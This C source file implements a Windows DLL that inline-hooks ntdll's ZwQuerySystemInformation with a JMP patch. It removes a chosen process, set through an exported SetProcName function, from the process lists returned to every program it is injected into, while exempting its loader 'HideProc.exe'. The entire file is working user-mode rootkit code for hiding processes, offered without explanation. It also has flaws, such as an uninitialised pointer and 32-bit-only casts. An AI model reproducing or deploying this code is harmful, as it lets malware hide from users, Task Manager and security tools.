
#include<Windows.h>
#include<tchar.h>
#include<Winternl.h>


#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()


#define DEF_NTDLL						("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION	("ZwQuerySystemInformation")
#define STATUS_SUCCESS					(0x00000000L)


typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
PVOID SystemInformation,
ULONG SystemInformationLength,
PULONG ReturnLength);


BOOL Hook_By_Code(LPCSTR, LPCSTR, PROC, PBYTE);
BOOL Unhook_By_Code(LPCSTR, LPCSTR, PBYTE);
NTSTATUS WINAPI NewZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);


BYTE g_pOriginalBytes[5] = { 0, };


__declspec(dllexport)void SetProcName(LPCTSTR szProcName)
{
	_tcscpy(g_szProcName, szProcName);

}


BOOL WINAPI DllMain(HINSTANCE hinsDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	char szCurProc[MAX_PATH] = { 0, };
	char * p = NULL;

	GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
	p = strrchr(szCurProc, '\\');
	if ((p != NULL) && !_stricmp(p + 1, "HideProc.exe"))
		return TRUE;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		Hook_By_Code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOriginalBytes);
		break;

	case DLL_PROCESS_DETACH:
		Unhook_By_Code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOriginalBytes);
		break;
		
	}

	return TRUE;
	

}


BOOL Hook_By_Code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{

	FARPROC pfnOriginal;
	DWORD dwOldProtect, dwAddress;

	BYTE pBuf[5] = { 0xE9, 0 };

	PBYTE pByte;

	pfnOriginal = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOriginal;

	if (pByte[0] == 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pfnOriginal, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pOrgBytes, pfnOriginal, 5);

	dwAddress = (DWORD)pfnNew - (DWORD)pfnOriginal - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	memcpy(pfnOriginal, pBuf, 5);

	VirtualProtect((LPVOID)pfnOriginal, 5, dwOldProtect, &dwOldProtect);

	return TRUE;


}

BOOL Unhook_By_Code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	if (pByte[0] != 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pFunc, pOrgBytes, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return FALSE;

}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS systemInformationClass,
	PVOID systemInformation, 
	ULONG systemInformationLength,
	PULONG returnLength	)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	Unhook_By_Code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOriginalBytes);

	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(systemInformationClass, systemInformation, systemInformationLength, returnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	if (systemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)systemInformation;

		while (TRUE)
		{
			if (pCur->Reserved2[1] != NULL)
			{
				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
				{

					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;

				}

				else
					pPrev = pCur;

				
			}

			if (pCur->NextEntryOffset == 0)
				break;
			
			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);


		}


	}

__NTQUERYSYSTEMINFORMATION_END:
	Hook_By_Code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOriginalBytes);

	return status;


}
